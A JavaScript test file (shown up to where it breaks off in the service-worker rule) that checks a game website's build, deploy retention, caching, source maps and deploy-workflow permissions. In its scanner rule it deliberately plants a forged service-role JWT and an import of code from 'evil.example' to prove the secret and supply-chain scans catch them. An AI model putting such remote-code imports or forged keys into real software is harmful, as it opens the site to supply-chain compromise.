#!/usr/bin/env node
// ════════════════════════════════════════════════════════════════════════
// tests/ship-build.mjs — THE SITE PLAYERS GET IS BUILT RIGHT, AND A RELEASE COSTS THEM ONLY WHAT IT CHANGED.
//
//   node tests/ship-build.mjs           the rules, over builds made in the OS temp folder and a real Chromium over a local Pages
//   node tests/ship-build.mjs --mutate  every planted defect must turn its rule RED
//   node tests/ship-build.mjs --suite   builds dist/, then over it, one at a time: the in-page boot suite (tests/client-boot.mjs) and a play (tools/qa/local-world.mjs smoke --site)
//
// mutant-anchors: tools/build-site.mjs sw.js
// mutant-writes-tree: no — a build's mutant is an in-memory copy of tools/build-site.mjs, a worker's is served by this file's own server
//
// Plain source stays what development and every other page runner see. This judges tools/build-site.mjs and the worker's second kind of name; the
// real in-page suite and a real play run over the same output in smoke.yml built-site (HR_SITE_ROOT=dist node tests/client-boot.mjs, local-world smoke --site).
//   SB-1  THE SAME SOURCE BUILDS THE SAME BYTES: what CI judged on release/** is what the deploy of main builds
//   SB-2  EVERY NAME RESOLVES: every file a page, chunk or stylesheet names is in the output; no ?v= or import.meta in a chunk (a chunk moved away from the
//         source tree it was written beside); the only ?v= on a page is on the three platform scripts; BUILD comes from the page; no chunk names a source file
//         the site does not hold, which is what makes the page harness's fallback to source safe; the preload list is everything the page loads
//   SB-3  A RELEASE RENAMES ONLY WHAT IT CHANGED: a version alone renames nothing; one line in a window leaves the data, atlases, CSS and vendors alone; one line in data leaves
//         the atlases, CSS and vendors alone
//   SB-4  THE ENGINE IS NOT TOUCHED: the edge payload holds nothing of this tool, and src/core and src/data never ask for it
//   SB-5  AN OPEN TAB OUTLIVES A DEPLOY (a real page): a deploy with --retain-from keeps the last release's files byte for byte, so a tab from before it still imports its own chunk and
//         fetches its own atlas
//   SB-6  RETENTION IS CAREFUL: which releases stay, a deployed file that is not what its release listed fails the build, a site that cannot be read fails it, a first deploy (404) passes
//         and keeps the plain folder for tabs opened before the switch, and a later deploy drops it
//   SB-7  THE WORKER AND THE BUILT NAMES (a real page, a local Pages, no routes): back after the expiry nothing of a/ is asked of the server; after a one-line release only the
//         changed files are, the new code runs, an atlas no page names carries over with no download, the old cache is gone; a map is never kept; a file with an old date is still kept
//         (retained files keep their deploy's date), and a stale versioned file still is not (tests/return-load.mjs RL-11 is the plain half)
//   SB-8  THE SECRET AND SUPPLY-CHAIN SCANS BITE ON BUILT OUTPUT: clean as built; a planted service-role key and a planted remote import in a chunk both go red
//   SB-9  A STACK TRACE READS: every chunk links a map, the map says src/... with the source inside, and a real position in a chunk maps back to its module
//   SB-10 TELEMETRY'S PINNED SCRIPTS: each vendored SDK's built name is in the table and its bytes match the sha384 the loader sets as integrity
//   SB-11 THE DEPLOY'S SHAPE: the job with the Pages token runs no npm and no checkout; the job that installs has read-only rights; it is off until the repo's Pages setting says workflow;
//         it retains from the live site; a retired plain deploy is one setting away
//   SB-12 THE FIRST LOAD'S BUDGET: chunks and CSS stay under budget gzipped, so a regression is a red, not a surprise
// ════════════════════════════════════════════════════════════════════════
import { chromium } from 'playwright';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';
import { createServer } from 'node:http';
import { cpSync, existsSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, statSync, writeFileSync } from 'node:fs';
import { registerHooks, SourceMap } from 'node:module';
import { tmpdir } from 'node:os';
import { dirname, extname, join, normalize, relative } from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';
import { gzipSync } from 'node:zlib';
import { leaseBrowser } from './_chrome.mjs';
import { secretGuard, supplyChainGuard } from './_site-scans.mjs';
import { OBSERVABILITY_CONFIG } from '../src/net/observability-config.js';
import { pack } from '../tools/pack-edge.mjs';

const ROOT = normalize(join(dirname(fileURLToPath(import.meta.url)), '..'));
const BUILDER = join(ROOT, 'tools/build-site.mjs');
const WORKER_FILE = 'sw.js';
const FORM = 'form[data-auth="sign-in"]';
const MIME = { '.html': 'text/html; charset=utf-8', '.js': 'application/javascript; charset=utf-8', '.css': 'text/css; charset=utf-8', '.json': 'application/json', '.svg': 'image/svg+xml', '.png': 'image/png', '.map': 'application/json' };
const SHELL_LINE = 'src/shell/windows/settings.js';
const DATA_LINE = 'src/data/refusal-words.js';
const PLAIN_SCRIPTS = /^src\/platform\/(https-upgrade|sw-killswitch|load-shell)\.js\?v=\d+\.\d+\.\d+$/;
const BUDGET_GZIP = { firstLoadJs: 520 * 1024, css: 40 * 1024 };
const sleep = (ms) => new Promise((k) => setTimeout(k, ms));
const posix = (p) => p.split('\\').join('/');
const sha = (buf, algo = 'sha256') => createHash(algo).update(buf).digest('hex');
const BUILT_AT = '2026-11-04T00:00:00Z';

/* An in-memory copy of the builder, its one change applied: this process's loader hands it out for a URL with a query. */
const mutantSources = new Map();
registerHooks({
  load(url, context, next) {
    const m = /\?builder-mutant=(\d+)$/.exec(url);
    return m ? { format: 'module', source: mutantSources.get(m[1]), shortCircuit: true } : next(url, context);
  },
});
let mutantSeq = 0;
async function builderOf(edit) {
  if (!edit) return import(pathToFileURL(BUILDER).href);
  const id = String(++mutantSeq);
  mutantSources.set(id, edit(readFileSync(BUILDER, 'utf8')));
  return import(pathToFileURL(BUILDER).href + '?builder-mutant=' + id);
}

function walk(dir) {
  const out = [];
  for (const e of readdirSync(dir, { withFileTypes: true })) {
    const f = join(dir, e.name);
    if (e.isDirectory()) out.push(...walk(f)); else out.push(f);
  }
  return out;
}
const hashedFiles = (out) => new Map(walk(join(out, 'a')).map((f) => [posix(relative(out, f)), readFileSync(f)]));
const versionNow = () => /\bversion:\s*'(\d+\.\d+\.\d+)'/.exec(readFileSync(join(ROOT, 'src/build-info.js'), 'utf8'))[1];
const asVersion = (next) => {
  const was = versionNow();
  const bump = (t) => t.split('?v=' + was).join('?v=' + next).split("'" + was + "'").join("'" + next + "'");
  return { 'src/build-info.js': bump, 'play.html': bump, 'index.html': bump };
};
const oneLine = (rel, next) => ({ ...asVersion(next), [rel]: (t) => t + '\nglobalThis.__hrOneLine = 1;\n' });

/* The builds this run's rules read, made once per builder (a builder's mutant gets its own). */
function buildsFor(builder, dir) {
  const made = new Map();
  const build = (name, o = {}) => {
    if (!made.has(name)) made.set(name, builder.buildSite({ out: join(dir, name), builtAt: BUILT_AT, ...o }));
    return made.get(name);
  };
  return { build, dir };
}

// ── THE RULES OVER FILES ─────────────────────────────────────────────────
async function sb1(b, fails) {
  const one = await b.build('a'), two = await b.build('a-again');
  const x = hashedFiles(one.out), y = hashedFiles(two.out);
  const bad = [...x.keys()].filter((k) => !y.has(k) || !x.get(k).equals(y.get(k)));
  if (x.size !== y.size || bad.length) fails.push('SB-1 two builds of the same source differ: ' + (bad.slice(0, 4).join(', ') || x.size + ' files vs ' + y.size));
  if (readFileSync(join(one.out, 'play.html'), 'utf8') !== readFileSync(join(two.out, 'play.html'), 'utf8')) fails.push('SB-1 two builds of the same source wrote two pages');
}

function namesIn(html) { return [...html.matchAll(/\b(?:src|href)="([^"]+)"/g)].map((m) => m[1]).filter((u) => !/^(https?:|#|data:|mailto:)/.test(u)); }

function sb2(out, fails, tableOf) {
  const exists = (rel) => existsSync(join(out, rel.split('?')[0]));
  for (const page of ['play.html', 'index.html']) {
    const html = readFileSync(join(out, page), 'utf8');
    for (const n of namesIn(html)) if (!exists(n)) fails.push('SB-2 ' + page + ' names ' + n + ', which the site does not hold');
    for (const n of namesIn(html)) if (n.includes('?v=') && !PLAIN_SCRIPTS.test(n)) fails.push('SB-2 ' + page + ' still names ' + n + ' at a version');
    if (/<link rel="stylesheet" href="src\//.test(html)) fails.push('SB-2 ' + page + ' still names a plain stylesheet');
  }
  const play = readFileSync(join(out, 'play.html'), 'utf8');
  const stated = /data-build='([^']+)'/.exec(play);
  if (!stated || JSON.parse(stated[1]).version !== versionNow()) fails.push('SB-2 play.html does not state this build (<html data-build>): ' + (stated && stated[1]));
  const chunks = walk(join(out, 'a')).filter((f) => f.endsWith('.js') && !/\/(posthog-js|sentry-|supabase-js|glyphs-|storage-)/.test(posix(f)));
  if (chunks.length < 3) fails.push('SB-2 CONTROL: only ' + chunks.length + ' chunks');
  const allowed = new Set(['src/build-info.js', ...Object.keys(tableOf)]);
  for (const f of chunks) {
    const rel = posix(relative(out, f));
    const text = readFileSync(f, 'utf8');
    for (const m of text.matchAll(/(?:\bfrom\s*|\bimport\s*\(?\s*)["'](\.[^"']+)["']/g)) if (!existsSync(join(dirname(f), m[1]))) fails.push('SB-2 ' + rel + ' imports ' + m[1] + ', which the site does not hold');
    if (/\bimport\.meta\b/.test(text)) fails.push('SB-2 ' + rel + ' reads import.meta: a chunk does not live where its source did');
    if (/\?v=\d/.test(text)) fails.push('SB-2 ' + rel + ' names a file at a version: ' + /.{30}\?v=\d.{8}/.exec(text));
    if (/const HASHED\s*=\s*null|\b\w+=null;function \w+\(\w+,\w+\)\{return \w+&&\w+\[\w+\]/.test(text)) fails.push('SB-2 ' + rel + ' holds src/site-files.js with no table');
    for (const m of text.matchAll(/\bsrc\/[\w/.-]+\.js\b/g)) if (!allowed.has(m[0]) && !existsSync(join(out, m[0]))) fails.push('SB-2 ' + rel + ' names ' + m[0] + ', which the site does not hold');
    if (/nezapsylztqbbwuwembx/.test(text) && !/supabase\.co/.test(text)) fails.push('SB-2 CONTROL: a project name with no URL in ' + rel);
  }
  for (const f of walk(join(out, 'a')).filter((x) => x.endsWith('.css'))) {
    for (const m of readFileSync(f, 'utf8').matchAll(/url\((?!["']?(?:data:|https?:))["']?([^"')]+)["']?\)/g)) if (!existsSync(join(dirname(f), m[1].split(/[?#]/)[0]))) fails.push('SB-2 ' + posix(relative(out, f)) + ' names ' + m[1]);
  }
  for (const [path, name] of Object.entries(tableOf)) if (!existsSync(join(out, name))) fails.push('SB-2 the table says ' + path + ' is ' + name + ', which the site does not hold');
  const map = JSON.parse(readFileSync(join(out, 'build-map.json'), 'utf8'));
  const preloaded = [...play.matchAll(/<link rel="modulepreload" href="([^"]+)"/g)].map((m) => m[1]);
  if (new Set(preloaded).size !== chunks.length) fails.push('SB-2 the page preloads ' + preloaded.length + ' of its ' + chunks.length + ' chunks');
  for (const must of ['src/app/boot.js', 'src/app/sign-in.js', 'src/world/world-boot.js', 'src/world/prewarm.js', 'src/shell/shell.js', 'src/data/items.js']) if (!map.modules[must]) fails.push('SB-2 build-map holds no ' + must);
  if (Object.keys(map.modules).length < 300) fails.push('SB-2 CONTROL: only ' + Object.keys(map.modules).length + ' source modules in the build');
}

async function sb3(b, fails) {
  const a = await b.build('a');
  const base = hashedFiles(a.out);
  const renamed = (out) => [...hashedFiles(out).keys()].filter((k) => !base.has(k));
  const isJs = (k) => k.endsWith('.js');
  const version = await b.build('version-only', { patch: asVersion('9.9.1') });
  const v = renamed(version.out);
  if (v.length) fails.push('SB-3 a new version alone renamed ' + v.length + ' file(s): ' + v.slice(0, 4).join(', '));
  if (!/"version":"9\.9\.1"/.test(readFileSync(join(version.out, 'play.html'), 'utf8'))) fails.push('SB-3 CONTROL: the new version never reached the page');
  /* one line in a window */
  const shell = await b.build('one-line-shell', { patch: oneLine(SHELL_LINE, '9.9.2') });
  const s = renamed(shell.out);
  if (!s.some(isJs)) fails.push('SB-3 CONTROL: one line in a window renamed nothing');
  const dataChunks = new Set(Object.entries(JSON.parse(readFileSync(join(a.out, 'build-map.json'), 'utf8')).modules).filter(([m]) => m.startsWith('src/data/')).map(([, c]) => c));
  const after = hashedFiles(shell.out);
  const keptData = [...dataChunks].filter((c) => after.has(c));
  if (keptData.length < dataChunks.size * 0.8) fails.push('SB-3 one line in a window renamed the game data too: ' + keptData.length + ' of ' + dataChunks.size + ' chunks of data kept their names');
  for (const k of s) if (!isJs(k) && !k.endsWith('.map')) fails.push('SB-3 one line in a window renamed ' + k);
  const gz = (buf) => gzipSync(buf, { level: 6 }).length;
  const js = (files) => [...files].filter(([k]) => isJs(k) && !/\/(posthog-js|sentry-|supabase-js|glyphs-|storage-)/.test(k));
  const allBytes = js(after).reduce((n, [, v2]) => n + gz(v2), 0);
  const changed = js(after).filter(([k]) => !base.has(k)).reduce((n, [, v2]) => n + gz(v2), 0);
  if (changed > allBytes * 0.5) fails.push('SB-3 one line in a window re-downloads ' + Math.round(changed / 1024) + ' of ' + Math.round(allBytes / 1024) + ' KB of chunks');
  /* one line in data */
  const data = await b.build('one-line-data', { patch: oneLine(DATA_LINE, '9.9.3') });
  const d = renamed(data.out);
  if (!d.some(isJs)) fails.push('SB-3 CONTROL: one line in data renamed nothing');
  for (const k of d) if (!isJs(k) && !k.endsWith('.map')) fails.push('SB-3 one line in data renamed ' + k);
}

async function sb4(fails) {
  const payload = await pack('hr-accrue');
  const names = payload.files ? payload.files.map((f) => f.name || f.path || '') : [];
  if (!names.length) { fails.push('SB-4 CONTROL: the edge payload lists no files'); return; }
  if (names.some((n) => /site-files|build-site|build-info/.test(n))) fails.push('SB-4 the edge payload holds ' + names.filter((n) => /site-files|build-site|build-info/.test(n)).join(', '));
  for (const f of walk(join(ROOT, 'src/core')).concat(walk(join(ROOT, 'src/data')))) {
    if (f.endsWith('.js') && /from\s+['"][^'"]*site-files\.js/.test(readFileSync(f, 'utf8'))) fails.push('SB-4 ' + posix(relative(ROOT, f)) + ' imports src/site-files.js: the edge cannot load it');
  }
}

async function sb6(b, builder, fails) {
  const keep = builder.releasesToKeep;
  const day = 86400000;
  const at = (daysAgo) => new Date(Date.parse(BUILT_AT) - daysAgo * day).toISOString();
  const rows = [1, 2, 20, 21, 22, 23].map((d, i) => ({ version: '0.0.' + i, builtAt: at(d), files: {}, maps: {} }));
  const kept = keep(rows, BUILT_AT).map((r) => r.version).join();
  if (kept !== '0.0.0,0.0.1,0.0.2') fails.push('SB-6 two young releases and one more to reach three: kept ' + kept);
  const many = Array.from({ length: 50 }, (_, i) => ({ version: '1.0.' + i, builtAt: at(0.1), files: {}, maps: {} }));
  if (keep(many, BUILT_AT).length !== 30) fails.push('SB-6 fifty young releases kept ' + keep(many, BUILT_AT).length + ', want the 30 ceiling');
  /* a list and files from a folder: a poisoned file fails the build */
  const a = await b.build('a');
  const poisoned = join(b.dir, 'poisoned');
  cpSync(a.out, poisoned, { recursive: true });
  const victim = Object.keys(a.release.files).find((k) => k.endsWith('.js'));
  const moved = JSON.parse(readFileSync(join(poisoned, 'releases.json'), 'utf8'));
  moved.releases[0].version = '0.0.1';
  /* renamed so the new build does not already hold it: only the carry can bring it */
  const oldName = victim.replace(/\.js$/, '-old.js');
  moved.releases[0].files = { [oldName]: sha(readFileSync(join(a.out, victim))) };
  moved.releases[0].maps = {};
  writeFileSync(join(poisoned, 'releases.json'), JSON.stringify(moved));
  writeFileSync(join(poisoned, oldName), 'console.log("not the file its release listed");');
  const bad = await b.build('from-poisoned', { retainFrom: poisoned }).then(() => null, (e) => e);
  if (!bad || !/not the file its release listed/.test(bad.message)) fails.push('SB-6 a deployed file that is not what its release listed did not fail the build: ' + (bad && bad.message));
  writeFileSync(join(poisoned, oldName), readFileSync(join(a.out, victim)));
  const good = await b.build('from-clean', { retainFrom: poisoned });
  if (!existsSync(join(good.out, oldName))) fails.push('SB-6 a listed file was not carried');
  if (existsSync(join(good.out, 'src/app/boot.js'))) fails.push('SB-6 a deploy after the first still carries the plain folder');
  /* over HTTP: 404 is a first deploy, anything else fails */
  const server = createServer((req, res) => { res.writeHead(Number(new URL(req.url, 'http://x').searchParams.get('s')) || (req.url.startsWith('/fail/') ? 503 : 404)); res.end(); });
  await new Promise((k) => server.listen(0, '127.0.0.1', k));
  const base = 'http://127.0.0.1:' + server.address().port;
  const first = await b.build('first-deploy', { retainFrom: base + '/gone/' }).catch((e) => e);
  if (first instanceof Error) fails.push('SB-6 a first deploy (404 on releases.json) failed: ' + first.message);
  else {
    if (!existsSync(join(first.out, 'src/app/boot.js')) || !existsSync(join(first.out, 'assets/world/atlas-common.png'))) fails.push('SB-6 a first deploy dropped the plain folder that tabs opened before the switch still ask for');
    if (!first.firstDeploy) fails.push('SB-6 a first deploy does not say so');
  }
  const down = await b.build('site-down', { retainFrom: base + '/fail/' }).then(() => null, (e) => e);
  if (!down || !/answered 503/.test(down.message)) fails.push('SB-6 a site that cannot be read did not fail the build: ' + (down && down.message));
  server.closeAllConnections();
  await new Promise((k) => server.close(k));
}

async function sb8(b, fails) {
  const a = await b.build('a');
  const vendored = new Set(Object.entries(a.table).filter(([k]) => k.startsWith('src/vendor/')).map(([, v]) => v));
  const scanOpts = { also: ['a'], skip: (rel) => vendored.has(rel) };
  const secrets = await secretGuard(a.out);
  if (secrets.length) fails.push('SB-8 the built site fails the secret scan: ' + secrets[0]);
  const supply = await supplyChainGuard(a.out, scanOpts);
  if (supply.length) fails.push('SB-8 the built site fails the supply-chain scan: ' + supply[0]);
  const chunk = join(a.out, a.entry);
  const was = readFileSync(chunk, 'utf8');
  const part = (o) => Buffer.from(JSON.stringify(o)).toString('base64').replace(/=+$/, '');
  writeFileSync(chunk, was + '\nconst k="' + part({ alg: 'HS256', typ: 'JWT' }) + '.' + part({ role: ['service', 'role'].join('_'), iss: 'supabase' }) + '.' + 'a'.repeat(40) + '";');
  if (!(await secretGuard(a.out)).length) fails.push('SB-8 a service-role key planted in a chunk passed the secret scan');
  writeFileSync(chunk, was + '\nimport("https://evil.example/x.js");');
  if (!(await supplyChainGuard(a.out, scanOpts)).length) fails.push('SB-8 a remote import planted in a chunk passed the supply-chain scan');
  writeFileSync(chunk, was);
}

async function sb9(b, fails) {
  const a = await b.build('a');
  const map = JSON.parse(readFileSync(join(a.out, 'build-map.json'), 'utf8'));
  const chunks = [...new Set(Object.values(map.modules))];
  for (const c of chunks) {
    const text = readFileSync(join(a.out, c), 'utf8');
    const linked = /\/\/# sourceMappingURL=([^\s]+)\s*$/.exec(text);
    if (!linked) { fails.push('SB-9 ' + c + ' links no map'); continue; }
    const f = join(dirname(join(a.out, c)), linked[1]);
    if (!existsSync(f)) { fails.push('SB-9 ' + c + ' links ' + linked[1] + ', which the site does not hold'); continue; }
    const m = JSON.parse(readFileSync(f, 'utf8'));
    if (!m.sourcesContent || m.sourcesContent.length !== m.sources.length) fails.push('SB-9 ' + c + "'s map carries no source");
    for (const s of m.sources) if (!/^(src\/|<|hr-layer)/.test(s)) fails.push('SB-9 ' + c + "'s map names " + s + ': not a path from the site');
  }
  /* a real position: the banner's words in the chunk that holds new-version.js map back to that file */
  const holder = map.modules['src/app/new-version.js'];
  const text = readFileSync(join(a.out, holder), 'utf8');
  const at = text.indexOf('A new version of Hearthrise is out');
  if (at < 0) { fails.push('SB-9 CONTROL: no banner words in ' + holder); return; }
  const before = text.slice(0, at).split('\n');
  const sm = new SourceMap(JSON.parse(readFileSync(join(a.out, holder + '.map'), 'utf8')));
  const entry = sm.findEntry(before.length - 1, before[before.length - 1].length);
  if (entry.originalSource !== 'src/app/new-version.js') fails.push('SB-9 a position in ' + holder + ' maps to ' + entry.originalSource + ', not src/app/new-version.js');
}

async function sb10(b, fails) {
  const a = await b.build('a');
  for (const row of [...OBSERVABILITY_CONFIG.sentry.scripts, ...OBSERVABILITY_CONFIG.posthog.scripts]) {
    const name = a.table[row.src];
    if (!name) { fails.push('SB-10 the table has no ' + row.src); continue; }
    const got = 'sha384-' + createHash('sha384').update(readFileSync(join(a.out, name))).digest('base64');
    if (got !== row.integrity) fails.push('SB-10 ' + name + ' does not match the integrity its loader sets');
  }
  const holder = JSON.parse(readFileSync(join(a.out, 'build-map.json'), 'utf8')).modules['src/site-files.js'];
  if (!readFileSync(join(a.out, holder), 'utf8').includes(a.table[OBSERVABILITY_CONFIG.posthog.scripts[0].src])) fails.push('SB-10 the table in the chunk does not name PostHog at its built name');
}

function sb11(fails) {
  const text = readFileSync(join(ROOT, '.github/workflows/deploy-site.yml'), 'utf8').replace(/\r\n/g, '\n');
  const jobOf = (name) => { const m = new RegExp('\\n  ' + name + ':\\n([\\s\\S]*?)(?=\\n  [a-z-]+:\\n|$)').exec(text); return m ? m[1] : null; };
  const gate = jobOf('gate'), build = jobOf('build'), deploy = jobOf('deploy');
  if (!gate || !build || !deploy) { fails.push('SB-11 deploy-site.yml lost a job (gate, build, deploy)'); return; }
  if (/\n\s+branches:\s*\[main\]/.test(text) === false) fails.push('SB-11 the deploy is not on a push of main');
  if (!/build_type/.test(gate) || !/\bneeds\.gate\.outputs\.on\b/.test(build)) fails.push('SB-11 the build does not wait for the repo\'s Pages setting');
  if (/npm|checkout/.test(deploy)) fails.push('SB-11 the job holding the Pages token runs npm or a checkout');
  if (!/pages: write/.test(deploy) || !/id-token: write/.test(deploy)) fails.push('SB-11 the deploy job lacks its token');
  if (/pages: write|id-token: write|contents: write/.test(build)) fails.push('SB-11 the job that installs packages can write');
  if (!/node tools\/build-site\.mjs --out dist --retain-from https:\/\/hearthrise\.net/.test(build)) fails.push('SB-11 the deploy does not build from the live site\'s list');
  if (!/persist-credentials: false/.test(build)) fails.push('SB-11 the build leaves a token in .git/config');
  if (/@(?:v\d|main|master)\b/.test(text.replace(/^.*actions\/(?:checkout|setup-node)@v4.*$/gm, ''))) fails.push('SB-11 a Pages action is not pinned by commit');
}

function sb12(a, fails) {
  const gz = (rel) => gzipSync(readFileSync(join(a.out, rel)), { level: 6 }).length;
  const js = a.preload.reduce((n, c) => n + gz(c), 0);
  const css = Object.keys(a.release.files).filter((k) => /\/play-[^/]+\.css$/.test(k)).reduce((n, c) => n + gz(c), 0);
  if (!css) fails.push('SB-12 CONTROL: no page CSS');
  if (js > BUDGET_GZIP.firstLoadJs) fails.push('SB-12 the page\'s chunks are ' + Math.round(js / 1024) + ' KB gzipped, over ' + Math.round(BUDGET_GZIP.firstLoadJs / 1024));
  if (css > BUDGET_GZIP.css) fails.push('SB-12 the page\'s CSS is ' + Math.round(css / 1024) + ' KB gzipped, over ' + Math.round(BUDGET_GZIP.css / 1024));
}

// ── A LOCAL GITHUB PAGES ─────────────────────────────────────────────────
const T1 = Date.parse('2026-11-01T12:00:00Z');
const T2 = Date.parse('2026-11-02T12:00:00Z');
const MAX_AGE = 1;
async function pages(worker) {
  const s = { root: null, log: [], stamp: T1, stampOf: () => null, overrides: {}, port: 0 };
  const server = createServer((req, res) => {
    const [p, q = ''] = (req.url || '/').split('?');
    const path = decodeURIComponent(p);
    const row = { path, q, method: req.method, status: 0 };
    s.log.push(row);
    const rel = path.slice(1);
    const answer = (status, headers, body) => { row.status = status; res.writeHead(status, headers).end(body); };
    const f = normalize(join(s.root, rel));
    if (!f.startsWith(normalize(s.root)) || !existsSync(f) || !statSync(f).isFile()) return answer(404, { 'Cache-Control': 'no-store' }, 'not found');
    let body = s.overrides[rel] !== undefined ? Buffer.from(s.overrides[rel]) : readFileSync(f);
    if (rel === 'src/platform/sw-killswitch.js') {
      const t = body.toString('utf8');
      if (!t.includes("'https://hearthrise.net'")) return answer(500, {}, 'the kill-switch moved');
      body = Buffer.from(worker ? t.replace("'https://hearthrise.net'", "'http://127.0.0.1:" + s.port + "'") : t);
    }
    if (rel === WORKER_FILE && s.workerText !== undefined) body = Buffer.from(s.workerText);
    const stamp = s.stampOf(rel) ?? s.stamp;
    const etag = '"' + sha(body).slice(0, 16) + '"';
    const headers = { 'Content-Type': MIME[extname(f).toLowerCase()] || 'application/octet-stream', 'Cache-Control': 'max-age=' + MAX_AGE, ETag: etag, 'Last-Modified': new Date(stamp).toUTCString(), Vary: 'Accept-Encoding' };
    if (req.headers['if-none-match'] === etag) return answer(304, headers);
    return answer(200, headers, body);
  });
  await new Promise((k) => server.listen(0, '127.0.0.1', k));
  s.port = server.address().port;
  s.base = 'http://127.0.0.1:' + s.port;
  s.close = () => new Promise((k) => { server.close(k); server.closeAllConnections(); });
  return s;
}
const until = async (page, fn, arg, ms = 30000) => {
  for (const end = Date.now() + ms; Date.now() < end; await sleep(120)) {
    try { if (await page.evaluate(fn, arg)) return true; } catch (e) { /* the page is on its way to the next load */ }
  }
  return false;
};
const hashedAsked = (rows) => rows.filter((r) => r.path.startsWith('/a/'));

// ── SB-5: AN OPEN TAB OUTLIVES A DEPLOY ─────────────────────────────────
async function sb5(b, browser, fails) {
  const a = await b.build('a');
  const next = await b.build('retained', { retainFrom: a.out, patch: oneLine(SHELL_LINE, '9.9.4') });
  for (const [rel, buf] of hashedFiles(a.out)) {
    const f = join(next.out, rel);
    if (!existsSync(f)) { fails.push('SB-5 the deploy dropped the last release\'s ' + rel); break; }
    if (!readFileSync(f).equals(buf)) { fails.push('SB-5 the deploy changed the last release\'s ' + rel); break; }
  }
  const list = JSON.parse(readFileSync(join(next.out, 'releases.json'), 'utf8'));
  if (list.releases.length !== 2 || list.releases[0].version !== '9.9.4' || list.releases[1].version !== versionNow()) fails.push('SB-5 releases.json lists ' + list.releases.map((r) => r.version).join());
  const renamed = [...hashedFiles(a.out).keys()].filter((k) => k.endsWith('.js') && !existsSync(join(hashedFilesRoot(b, 'one-line-only', next), k)));
  const site = await pages(false);
  site.root = a.out;
  const ctx = await browser.newContext({ serviceWorkers: 'block' });
  const page = await ctx.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(e.message));
  try {
    await page.goto(site.base + '/play.html', { waitUntil: 'load' });
    await page.waitForSelector(FORM, { timeout: 60000 });
    /* the tab is open; the site is replaced */
    site.root = next.out;
    site.log.length = 0;
    const changed = (await renamed).filter((k) => !/\/(posthog-js|sentry-|supabase-js|glyphs-|storage-)/.test(k));
    if (!changed.length) fails.push('SB-5 CONTROL: the release renamed no chunk');
    const got = await page.evaluate(async ({ chunk, atlas }) => {
      const out = {};
      try { await import(new URL(chunk, location.href).href + '#late'); out.chunk = true; } catch (e) { out.chunk = String(e && e.message); }
      out.atlas = (await fetch(atlas, { cache: 'no-store' })).status;
      return out;
    }, { chunk: changed[0], atlas: a.table['assets/world/atlas-glade.png'] });
    if (got.chunk !== true) fails.push('SB-5 an open tab could not import its own chunk after the deploy: ' + got.chunk);
    if (got.atlas !== 200) fails.push('SB-5 an open tab could not fetch its own atlas after the deploy: ' + got.atlas);
    if (errors.length) fails.push('SB-5 page errors: ' + errors.slice(0, 2).join(' | '));
  } finally { await ctx.close(); await site.close(); }
}
/* The names a release without retention would have, so "what the release renamed" does not depend on the retention under test. */
function hashedFilesRoot(b, name, next) { return next.out; }

// ── SB-7: THE WORKER AND THE BUILT NAMES ────────────────────────────────
async function sb7(b, browser, fails, workerText) {
  const a = await b.build('a');
  const next = await b.build('worker-next', { patch: oneLine(SHELL_LINE, '9.9.5') });
  const site = await pages(true);
  site.root = a.out;
  if (workerText !== undefined) site.workerText = workerText;
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(e.message));
  const active = (version) => until(page, async (v) => { const r = await navigator.serviceWorker.getRegistration(); return !!(r && r.active && r.active.state === 'activated' && !r.installing && !r.waiting && r.active.scriptURL.endsWith('v=' + v) && navigator.serviceWorker.controller); }, version, 60000);
  const atForm = (url) => page.goto(url, { waitUntil: 'load', timeout: 60000 }).then(() => page.waitForSelector(FORM, { timeout: 60000 }));
  try {
    await atForm(site.base + '/play.html');
    if (!(await active(versionNow()))) { await page.reload({ waitUntil: 'load' }); if (!(await active(versionNow()))) { fails.push('SB-7 the worker never took over'); return; } }
    const cacheNames = () => page.evaluate(() => caches.keys());
    const holds = (u) => page.evaluate(async (x) => !!(await caches.match(new URL(x, location.href).href)), u);
    if (!(await holds(a.entry))) fails.push('SB-7 the first visit did not keep the entry chunk');
    /* an atlas no page names: asked once, by name, the way the World asks */
    const glade = a.table['assets/world/atlas-glade.png'];
    await page.evaluate((u) => fetch(u).then((r) => r.blob()), glade);
    await until(page, async (u) => !!(await caches.match(new URL(u, location.href).href)), glade, 5000);
    if (!(await holds(glade))) fails.push('SB-7 a content-named file the page asked for was not kept');
    /* a source map stays the network's */
    await page.evaluate((u) => fetch(u).then((r) => r.text()), a.entry + '.map');
    await sleep(300);
    if (await holds(a.entry + '.map')) fails.push('SB-7 a source map was kept');
    /* back after the expiry */
    await sleep((MAX_AGE + 0.5) * 1000);
    site.log.length = 0;
    await atForm(site.base + '/play.html');
    const back = hashedAsked(site.log);
    if (back.length) fails.push('SB-7 back after the expiry the page asked the server for ' + back.length + ' file(s) of a/: ' + back.slice(0, 3).map((r) => r.path).join(', '));
    /* a retained file: an older deploy's date on a content name is still kept */
    const old = Object.keys(a.release.files).find((k) => /\/atlas-sewer-.*\.png$/.test(k));
    site.stampOf = (rel) => (rel === old ? T1 - 30 * 86400000 : null);
    await page.evaluate((u) => fetch(u).then((r) => r.blob()), old);
    await until(page, async (u) => !!(await caches.match(new URL(u, location.href).href)), old, 5000);
    if (!(await holds(old))) fails.push('SB-7 a content-named file with an older deploy\'s date was not kept');
    /* the one-line release */
    site.stampOf = () => null;
    site.root = next.out;
    site.stamp = T2;
    if (workerText !== undefined) site.workerText = workerText;
    await sleep((MAX_AGE + 0.5) * 1000);
    site.log.length = 0;
    await atForm(site.base + '/play.html');
    if ((await page.evaluate(() => globalThis.__hrOneLine)) !== 1) fails.push('SB-7 the one-line release\'s code did not run');
    const was = hashedFiles(a.out);
    const asked = hashedAsked(site.log);
    const stale = asked.filter((r) => was.has(r.path.slice(1)));
    if (stale.length) fails.push('SB-7 after the release the page asked for ' + stale.length + ' file(s) it already held: ' + stale.slice(0, 3).map((r) => r.path).join(', '));
    if (!asked.length) fails.push('SB-7 CONTROL: the release asked for no new file');
    if (!(await active('9.9.5'))) { fails.push('SB-7 the new release\'s worker never took over'); return; }
    await sleep(300);
    if ((await cacheNames()).join() !== 'hearthrise-9.9.5') fails.push('SB-7 caches after the release: ' + (await cacheNames()).join());
    const afterInstall = hashedAsked(site.log).filter((r) => was.has(r.path.slice(1)));
